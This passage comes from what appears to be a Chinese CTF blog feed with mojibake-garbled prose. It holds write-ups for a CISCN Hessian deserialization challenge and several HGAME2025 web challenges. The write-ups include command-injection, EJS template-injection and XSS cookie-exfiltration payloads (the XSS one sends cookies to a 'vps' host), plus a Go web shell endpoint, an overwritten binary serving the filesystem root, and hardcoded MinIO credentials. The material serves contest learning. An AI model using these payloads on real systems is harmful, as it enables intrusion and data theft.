class="hljs-title function_">des</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessianInput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(byteArrayInputStream);<br>        System.out.println(<span class="hljs-string">&quot;\nDeserialization of object.&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> hessianInput.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (EOFException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;Unexpected end of file while reading object&quot;</span>, e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/02/05/CISCN2025-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF0%E8%A7%A3%E9%A2%98-bookmanager%E6%B5%85%E6%9E%90/image-20250205165508392.png" alt="image-20250205165508392"></p><p>å½“ç„¶è¿™æ˜¯å‡ºç½‘æ‰“æ³•ï¼Œè€Œæ¯”èµ›æ—¶é‚£é“é¢˜æ®è¯´ä¸å‡ºç½‘ï¼ŒæŒ‰é“ç†æ¥è¯´åº”è¯¥æ˜¯curlå°†æ ¹ç›®å½•çš„flagç»™æ˜ å°„åˆ°booké¡µé¢ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;curl -X POST http://127.0.0.1:8080/api/rest/book/addBook -H \&quot;Content-Type: application/json\&quot; -d &#x27;&#123;\&quot;bookId\&quot;: 1, \&quot;title\&quot;: \&quot;&#x27;$(cat /flag)&#x27;\&quot;, \&quot;author\&quot;: \&quot;&#x27;EddieMurphy&#x27;\&quot;, \&quot;publishDate\&quot;: \&quot;2025-01-01\&quot;, \&quot;price\&quot;: 13.14&#125;&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    body = f.read()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(body))<br><br>url = <span class="hljs-string">&quot;http://localhost:8080/api/rest/book/getBook&quot;</span><br>headers = &#123; <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/hessian&quot;</span> &#125;<br>response = requests.get(url, headers=headers, data=body)<br><span class="hljs-built_in">print</span>(response.text)<br><br>url = <span class="hljs-string">&quot;http://localhost:8080/api/rest/book/getAllBooks&quot;</span><br>response = requests.get(url)<br><span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;flag\&#123;[^\&#125;]+\&#125;&#x27;</span>, response.text)<br><span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">0</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;Flag not found&quot;</span>)<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥æ‰“å†…å­˜é©¬ï¼ˆä½†æ˜¯æ²¡æ—¶é—´çœ‹äº†hhhï¼‰ã€‚</p><p>é«˜æ‰‹è¿‡æ‹›ï¼Œç‚¹åˆ°ä¸ºæ­¢å§ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://github.com/frohoff/jdk8u-jdk/blob/master/src/solaris/classes/sun/print/UnixPrintService.java">jdk8u-jdk&#x2F;src&#x2F;solaris&#x2F;classes&#x2F;sun&#x2F;print&#x2F;UnixPrintService.java at master Â· frohoff&#x2F;jdk8u-jdk</a></p><p><a href="https://p0lar1ght.github.io/posts/%E7%AC%AC%E5%8D%81%E5%85%AB%E5%B1%8A%E5%9B%BD%E8%B5%9B%E6%9A%A8%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF_WEB_bookmanager%E9%A2%98%E8%A7%A3/#%E4%BA%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">ç¬¬åå…«å±Šå›½èµ›æš¨ç¬¬äºŒå±Šé•¿åŸæ¯-bookmanageré¢˜è§£ | P0l@R19ht</a></p><p><a href="https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/#/hessian">Hessian UTF-8 Overlong Encoding - X1r0z Blog</a></p><p><a href="https://www.freebuf.com/articles/web/409400.html">å›½äº§webæ¡†æ¶Solon - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><a href="https://pankas.top/2024/08/18/%E5%9B%BD%E4%BA%A7web%E6%A1%86%E6%9E%B6solon-v2.5.11rce%E6%BC%8F%E6%B4%9E/">å›½äº§webæ¡†æ¶Solon-v2.5.11RCEæ¼æ´</a></p><p><a href="https://xz.aliyun.com/news/16315">æ–‡ç«  - 2024 CISCN &amp; ç¬¬äºŒå±Šé•¿åŸæ¯é“äººä¸‰é¡¹èµ› 0è§£Web BookManager é¢˜è§£ - å…ˆçŸ¥ç¤¾åŒº</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HGAME2025-WEB</title>
    <link href="/2025/02/04/HGAME2025-WEB/"/>
    <url>/2025/02/04/HGAME2025-WEB/</url>
    
    <content type="html"><![CDATA[<h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><p>çœ‹çœ‹HGAMEï¼Œç¡®å®å¥½é¢˜å•Šã€‚</p><h2 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a>Level 24 Pacman</h2><p>JSé¢˜ï¼Œå‰ç«¯jsç¡®å®èƒ½çœ‹åˆ°ç–‘ä¼¼base64çš„ä¸œè¥¿ï¼Œè§£å¯†åå†æ …æ è§£å¯†å´æ˜¯å‡çš„flagã€‚</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205004112370.png" alt="image-20250205004112370"></p><p>å¯¹äºå®ƒè¯´çš„10000åˆ†ï¼Œæœå®ƒçš„åå…­è¿›åˆ¶ï¼Œå‘ç°æœ‰ä¸ªæ¯”è¾ƒçš„é€»è¾‘ï¼Œå¯¹åº”0x270fï¼Œä¹Ÿå°±æ˜¯9999çš„åå…­è¿›åˆ¶ã€‚</p><p>ä»å˜é‡èƒ½æ‰¾åˆ°<code>_SCORE</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥åœ¨consoleè®¾ç½®<code>_SCORE=10000</code>ï¼Œç„¶åæ­»äº”æ¬¡å°±è·å¾—äº†ä¸ªbase64ï¼Œå†æ …æ è§£å¯†å¾—åˆ°çœŸæ­£çš„flagï¼š</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205004119424.png" alt="image-20250205004119424"></p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205004134993.png" alt="image-20250205004134993"></p><h2 id="Level-47-BandBomb"><a href="#Level-47-BandBomb" class="headerlink" title="Level 47 BandBomb"></a>Level 47 BandBomb</h2><p>ç»™äº†ä¸ªapp.jsï¼Œè¿˜æœ‰ä¸ªä¸Šä¼ è·¯å¾„ã€‚</p><p>å…¶å®æœ¬åœ°æ­å¥½ç¯å¢ƒå°±çŸ¥é“æ–‡ä»¶ç›®å½•ç»“æ„æ˜¯å•¥ï¼Œpublicç›®å½•ä¸‹çš„ä¸œè¥¿æ˜¯è¢«æ˜ å°„åˆ°&#x2F;staticè·¯ç”±ä¸‹äº†ï¼Œè¿˜æœ‰ä¸ªmortis.ejså­˜åœ¨äºviewsç›®å½•ä¸‹ã€‚ç»™äº†ä¸ªrenameè·¯ç”±ï¼Œå…¶å®æœ¬åœ°æµ‹æµ‹å¯ä»¥å‘ç°è¿™é‡Œå¯ä»¥æ–‡ä»¶è¦†ç›–ã€‚æ„æ€å¯ä»¥ç†è§£ä¸ºlinuxå‘½ä»¤ä¸­çš„mvã€‚</p><p>æœ¬æ¥ç›´æ¥renameæ ¹ç›®å½•ä¸‹çš„flagåˆ°&#x2F;staticé‚£ä¸ªè·¯ç”±ä¸‹çš„å›¾ç‰‡å°±å‡ºäº†ï¼Œä½†æ˜¯å®ƒæœ¬åœ°æ ¹ç›®å½•æ²¡æ”¾flagï¼Œä¼°è®¡åœ¨ç¯å¢ƒå˜é‡æˆ–è€…è¦Rã€‚</p><p>è¿™é‡Œæœ‰å‡ ç§å¸¸è§„åšæ³•ï¼Œç¬¬ä¸€ç§å°±æ˜¯å‰é¢è¯´çš„ç›´æ¥ä¼ è¿‡å»ï¼Œä½†æ˜¯å¤±è´¥ã€‚ç¬¬äºŒç§æ˜¯å†™è®¡åˆ’ä»»åŠ¡çœ‹èƒ½ä¸èƒ½å¼¹ä¸ªshellï¼Œç¬¬ä¸‰ç§å°±æ˜¯ç”¨å®ƒçš„ejsæ¥æ‰“SSTIç›´æ¥æ¨¡æ¿æ³¨å…¥äº†ï¼Œå› ä¸ºæºç ä¸­å†™å‡ºäº†renderè¿™ä¸€æ¸²æŸ“é€»è¾‘ã€‚</p><p>è¿™é‡Œç”¨çš„å°±æ˜¯ç¬¬ä¸‰ç§æ–¹æ³•ï¼Œå¯ä»¥Rã€‚</p><p><a href="https://xz.aliyun.com/news/11769">æ–‡ç«  - Ejsæ¨¡æ¿å¼•æ“æ³¨å…¥å®ç°RCE - å…ˆçŸ¥ç¤¾åŒº</a></p><p><a href="https://www.cnblogs.com/hackerone/p/17216027.html">hxp ctf valentine ejs ssti è¯­æ³•ç‰¹æ€§é€ æˆçš„æ¼æ´ - Galio - åšå®¢å›­</a></p><p>æœ¬æ¥æˆ‘æƒ³é€ ä¸ªå†…å­˜é©¬ï¼Œä½†æ˜¯å¥½åƒéœ€è¦app.jsçš„é…åˆï¼Œä½†æ˜¯å·²ç»å¯åŠ¨çš„æœåŠ¡è¦†ç›–äº†app.jsä¹Ÿæ²¡ç”¨ï¼Œéœ€è¦é‡å¯ã€‚æ‰€ä»¥åªèƒ½ä¸€æ¬¡æ¸²æŸ“æˆåŠŸã€‚</p><p>æµ‹äº†ä¸‹ï¼Œæœºå­æ²¡bashï¼Œæœ‰ncï¼Œä½†ä¸å‡ºç½‘ï¼š</p><p><img src="/2025/02/04/HGAME2025-WEB/14729c69a51b19f1ed0687a9cfad0f07.png" alt="img"></p><p>ç›´æ¥è¯»envåˆ°&#x2F;staticç›®å½•ç®—äº†ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;%= <span class="hljs-variable language_">global</span>.<span class="hljs-property">process</span>.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;env &gt; /app/public/1.txt&quot;</span>) %&gt;<br></code></pre></td></tr></table></figure><p>å…ˆä¸Šä¼ åˆ°uploadsç›®å½•ï¼Œç„¶åç›´æ¥è¦†ç›–ï¼š</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205005044113.png" alt="image-20250205005044113"></p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205004640527.png" alt="image-20250205004640527"></p><p>å…¶å®ä¹Ÿå¯ä»¥ç›´æ¥</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;%= process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG</span> %&gt;<br></code></pre></td></tr></table></figure><p>è™½ç„¶ç®—äº‹åè¯¸è‘›äº®äº†ï¼Œå› ä¸ºå¦‚æœä¸åœ¨ç¯å¢ƒå˜é‡ï¼Œé˜ä¸‹è¯¥å¦‚ä½•åº”å¯¹ï¼Ÿè¿˜æ˜¯å¾—Rå•Šã€‚</p><h2 id="Level-69-MysteryMessageBoard"><a href="#Level-69-MysteryMessageBoard" class="headerlink" title="Level 69 MysteryMessageBoard"></a>Level 69 MysteryMessageBoard</h2><p>ç®€å•çš„XSSã€‚</p><p>ç™»å½•æç¤ºå…¶å®å°±æ˜¯å¼±å¯†ç ï¼Œ888888è¿›äº†ã€‚</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205005445100.png" alt="image-20250205005445100"></p><p>ç„¶åå‘ç°æœ‰ä¸ªç•™è¨€æ¿ï¼ŒæŠ“åŒ…æœ‰cookieï¼Œç•™è¨€æ¿å†™xssçš„payloadèƒ½å¼¹æ¡†ã€‚</p><p>æ‰«è·¯å¾„å‘ç°ä¸ª&#x2F;adminï¼Œæç¤ºæ˜¯adminä¼šæ¥çœ‹ç•™è¨€æ¿ï¼Œé‚£ä¹ˆæ€è·¯å°±æ˜¯å…ˆåœ¨ç•™è¨€æ¿å†™ä¸ªå¤–å¸¦cookieçš„payloadï¼Œç„¶åè®¿é—®&#x2F;adminï¼Œvpsä¼šæ¥æ”¶åˆ°adminè®¿é—®çš„admin_cookieã€‚</p><p>å†å¸¦admin_cookieæ‰«è·¯å¾„å¯ä»¥å‘ç°&#x2F;flagè·¯å¾„ï¼Œå¸¦cookieè®¿é—®è·å¾—flagï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;location.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://vps/?cookie=&quot;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205005355739.png" alt="image-20250205005355739"></p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205005419060.png" alt="image-20250205005419060"></p><h2 id="Level-25-åŒé¢äººæ´¾å¯¹"><a href="#Level-25-åŒé¢äººæ´¾å¯¹" class="headerlink" title="Level 25 åŒé¢äººæ´¾å¯¹"></a>Level 25 åŒé¢äººæ´¾å¯¹</h2><p>ç»™äº†ä¿©urlï¼Œå¼€å§‹ä»¥ä¸ºæ˜¯k8sï¼Œä½†æ˜¯ç¡®å®ä¹Ÿæœ‰æ¸Šæºã€‚</p><p>ä¸‹é¢é‚£ä¸ªå¯ä»¥ç›´æ¥è¯»åˆ°ä¸€ä¸ªmainæ–‡ä»¶ï¼Œä¸çŸ¥é“å•¥ç©æ„ï¼Œä½†æ˜¯fileæŸ¥çœ‹å¾—çŸ¥æ˜¯ä¸ªelfï¼Œç›´æ¥è¿è¡Œä¸€ä¸‹çœ‹çœ‹ï¼š</p><p><img src="/2025/02/04/HGAME2025-WEB/c5db86a0024278a4bfd51621332b1387.png" alt="img"></p><p>å‘ç°æ˜¯ä¸ªgoç¼–è¯‘çš„ï¼Œä¼šä¸€ç›´è®¿é—®localhost:9000çš„æ¡¶å­ã€‚</p><p>æç¤ºé‚£ä¸ªå¥³äººï¼Œåº”è¯¥æ˜¯IDAç»™å®ƒé€†ä¸€ä¸‹ï¼ŒUPXåŠ å£³äº†ï¼Œè„±ä¸€ä¸‹å°±è¡Œäº†ã€‚</p><p>IDAæ‰“å¼€ï¼Œæœç´¢å­—ç¬¦ä¸²å‘ç°äº†ç¡¬ç¼–ç çš„ACCESS_KEYå’ŒSECRET_KEYï¼Œç”¨çš„minioé›†ç¾¤åˆ†å¸ƒï¼š</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205010009560.png" alt="image-20250205010009560"></p><p>æœä¸€ä¸‹minioçš„æ“ä½œæ‰‹å†Œï¼Œè·å¾—äº†è¿™ä¿©ç©æ„å…¶å®å¯ä»¥ç›´æ¥adminç™»å½•çœ‹æ¡¶å­ã€‚å¯ä»¥ç”¨python-sdkäº¤äº’ä¹Ÿå¯ä»¥ä¸‹mcæ¥å‘½ä»¤è¡Œäº¤äº’ï¼Œè¿˜å¯ä»¥ç¼–è¯‘ä¸ªconsoleæ¥å›¾å½¢åŒ–æ“ä½œã€‚</p><p>è¿æ¥ç¬¬ä¸€ä¸ªurlï¼Œä¼šå‘ç°æœ‰hintå’Œprodbucketä¸¤ä¸ªæ¡¶å­ï¼Œhinté‡Œç»™äº†æºç ï¼Œprodbucketæ¡¶å­é‡Œç»™äº†ä¸ªupdateå¯¹è±¡ï¼Œä¹Ÿæ˜¯ä¸ªelfæ–‡ä»¶ï¼Œå¯¼ä¸‹æ¥å‘ç°è¿™ä¸ªelfå°±æ˜¯æˆ‘ä»¬å‰é¢è·å¾—çš„mainæ–‡ä»¶ã€‚</p><p>é‚£ä¹ˆå¯ä»¥å°è¯•æ›´æ–°è¿™ä¸ªupdateä¸ºæˆ‘ä»¬è‡ªå·±å¯¼å…¥çš„æ¶æ„æœåŠ¡ã€‚ç„¶è€Œè¿™ä¸ªæœåŠ¡è¿˜æ˜¯ä¸å‡ºç½‘emm</p><p>çœ‹äº†ä¸‹æºç ï¼Œå‘ç°å¯¹ä¸Šç¬¬äºŒä¸ªurlçš„æœåŠ¡æ˜¯æ‰“å¼€äº†å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶è¯»å–ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥æ”¹ä¸€ä¸‹å†ç¼–è¯‘æˆæ–°çš„elfï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;level25/fetch&quot;</span><br><br><span class="hljs-string">&quot;level25/conf&quot;</span><br><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><span class="hljs-string">&quot;github.com/jpillora/overseer&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fetcher := &amp;fetch.MinioFetcher&#123;<br>Bucket:    conf.MinioBucket,<br>Key:       conf.MinioKey,<br>Endpoint:  conf.MinioEndpoint,<br>AccessKey: conf.MinioAccessKey,<br>SecretKey: conf.MinioSecretKey,<br>&#125;<br>overseer.Run(overseer.Config&#123;<br>Program: program,<br>Fetcher: fetcher,<br>&#125;)<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">program</span><span class="hljs-params">(state overseer.State)</span></span> &#123;<br>g := gin.Default()<br><span class="hljs-comment">//g.StaticFS(&quot;/&quot;, gin.Dir(&quot;.&quot;, true))</span><br>g.StaticFS(<span class="hljs-string">&quot;/&quot;</span>, gin.Dir(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-literal">true</span>))<br>g.Run(<span class="hljs-string">&quot;:8080&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>å°†æ–°ç¼–è¯‘çš„æ–‡ä»¶å‘½åä¸ºupdateï¼Œè™½ç„¶å‘ç°ä¸èƒ½ç›´æ¥åˆ é™¤æ¡¶å­é‡Œçš„updateï¼Œä½†æ˜¯å¯ä»¥è¦†ç›–æ‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> minio <span class="hljs-keyword">import</span> Minio<br><span class="hljs-keyword">from</span> minio.error <span class="hljs-keyword">import</span> S3Error<br><br><span class="hljs-comment"># Initialize MinIO client</span><br>client = Minio(<br>    <span class="hljs-string">&quot;node2.hgame.vidar.club:31749&quot;</span>,<br>    access_key=<span class="hljs-string">&quot;minio_admin&quot;</span>,<br>    secret_key=<span class="hljs-string">&quot;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=&quot;</span>,<br>    secure=<span class="hljs-literal">False</span>  <span class="hljs-comment"># Set to True if using HTTPS</span><br>)<br><br><span class="hljs-comment"># Specify bucket and object</span><br>bucket_name = <span class="hljs-string">&quot;prodbucket&quot;</span><br>object_name = <span class="hljs-string">&quot;update&quot;</span><br>file_path = <span class="hljs-string">&quot;./update&quot;</span>  <span class="hljs-comment"># Local path to the file you want to upload</span><br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment"># Check if the bucket exists</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> client.bucket_exists(bucket_name):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Bucket <span class="hljs-subst">&#123;bucket_name&#125;</span> does not exist.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># Upload the file</span><br>        client.fput_object(bucket_name, object_name, file_path)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;File &#x27;<span class="hljs-subst">&#123;file_path&#125;</span>&#x27; has been uploaded as &#x27;<span class="hljs-subst">&#123;object_name&#125;</span>&#x27; to bucket &#x27;<span class="hljs-subst">&#123;bucket_name&#125;</span>&#x27;.&quot;</span>)<br><br><span class="hljs-keyword">except</span> S3Error <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>æˆ–è€…å›¾å½¢åŒ–ï¼š</p><p><img src="/2025/02/04/HGAME2025-WEB/aa69dd62b7ee49c2df866b90faad563e.png" alt="img"></p><p>è™½ç„¶æŠ¥é”™ï¼Œä½†å…¶å®çœ‹æ–‡ä»¶å¤§å°å°±çŸ¥é“å·²ç»è¦†ç›–æˆåŠŸäº†ï¼Œè€Œè¿™ä¸ªæœåŠ¡ç¡®å®ä¹Ÿæ˜¯å®æ—¶çš„ã€‚</p><p>ç­‰ä¸€æ®µæ—¶é—´ï¼Œè®¿é—®ç¬¬äºŒä¸ªurlï¼Œå‘ç°å·²ç»æ›¿æ¢æˆæˆ‘ä»¬çš„æ¶æ„æœåŠ¡äº†ï¼š</p><p><img src="/2025/02/04/HGAME2025-WEB/36bac489fe24dcfe0fc67a9183950f2d.png" alt="img"></p><p>ç›´æ¥è¯»flagå°±è¡Œï¼š</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205010605878.png" alt="image-20250205010605878"></p><p>å½“ç„¶ä¹Ÿå¯ä»¥å†™ä¸ªç±»ä¼¼å†…å­˜é©¬é‚£ç§RCEç«¯ç‚¹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Route to execute arbitrary shell command</span><br>g.POST(<span class="hljs-string">&quot;/exec&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>    command := c.PostForm(<span class="hljs-string">&quot;command&quot;</span>)<br>    <span class="hljs-keyword">if</span> command == <span class="hljs-string">&quot;&quot;</span> &#123;<br>        c.JSON(<span class="hljs-number">400</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;No command provided&quot;</span>&#125;)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br><br>    output, err := exec.Command(<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, command).CombinedOutput()<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        c.JSON(<span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: err.Error(), <span class="hljs-string">&quot;output&quot;</span>: <span class="hljs-type">string</span>(output)&#125;)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br><br>    c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<span class="hljs-string">&quot;output&quot;</span>: <span class="hljs-type">string</span>(output)&#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><h2 id="Level-38475-è§’è½"><a href="#Level-38475-è§’è½" class="headerlink" title="Level 38475 è§’è½"></a>Level 38475 è§’è½</h2><p>æ‰“å¼€ä¸€ä¸ªç•™è¨€æ¿ï¼Œçœ‹é¢˜ç›®æè¿°è¿˜ä»¥ä¸ºåˆæ˜¯XSSã€‚</p><p>ä½†å…¶å®ä¸æ˜¯ã€‚</p><p>æ‰«è·¯å¾„èƒ½æ‰«åˆ°robots.txtï¼Œç»™äº†ä¸ªapp.confï¼Œè¯»ä¸€ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"># <span class="hljs-title class_">Include</span> by httpd.<span class="hljs-property">conf</span><br>&lt;<span class="hljs-title class_">Directory</span> <span class="hljs-string">&quot;/usr/local/apache2/app&quot;</span>&gt;<br><span class="hljs-title class_">Options</span> <span class="hljs-title class_">Indexes</span><br><span class="hljs-title class_">AllowOverride</span> <span class="hljs-title class_">None</span><br><span class="hljs-title class_">Require</span> all granted<br>&lt;/<span class="hljs-title class_">Directory</span>&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Files</span> &quot;/<span class="hljs-attr">usr</span>/<span class="hljs-attr">local</span>/<span class="hljs-attr">apache2</span>/<span class="hljs-attr">app</span>/<span class="hljs-attr">app.py</span>&quot;&gt;</span></span><br><span class="language-xml">    Order Allow,Deny</span><br><span class="language-xml">    Deny from all</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Files</span>&gt;</span></span><br><br><span class="hljs-title class_">RewriteEngine</span> <span class="hljs-title class_">On</span><br><span class="hljs-title class_">RewriteCond</span> <span class="hljs-string">&quot;%&#123;HTTP_USER_AGENT&#125;&quot;</span> <span class="hljs-string">&quot;^L1nk/&quot;</span><br><span class="hljs-title class_">RewriteRule</span> <span class="hljs-string">&quot;^/admin/(.*)$&quot;</span> <span class="hljs-string">&quot;/$1.html?secret=todo&quot;</span><br><br><span class="hljs-title class_">ProxyPass</span> <span class="hljs-string">&quot;/app/&quot;</span> <span class="hljs-string">&quot;http://127.0.0.1:5000/&quot;</span><br></code></pre></td></tr></table></figure><p>ä¹ä¸€çœ‹æ²¡å•¥ç”¨ï¼Œå°±ä¸‹é¢çš„rewriteé€»è¾‘æœ‰ç‚¹ä¸œè¥¿ã€‚</p><p>å¤§ç±³è€å¸ˆè¿˜çœŸæœåˆ°äº†ï¼Œç‰›çš„ï¼š</p><p><a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/apache.html#acl-bypass">Apache - HackTricks</a></p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205170940950.png" alt="image-20250205170940950"></p><p>ACL-Bypassã€‚</p><p>æ„æ€å°±æ˜¯å¯ä»¥è¶Šæƒè·¯å¾„è¯»æ–‡ä»¶äº†ï¼š</p><p><img 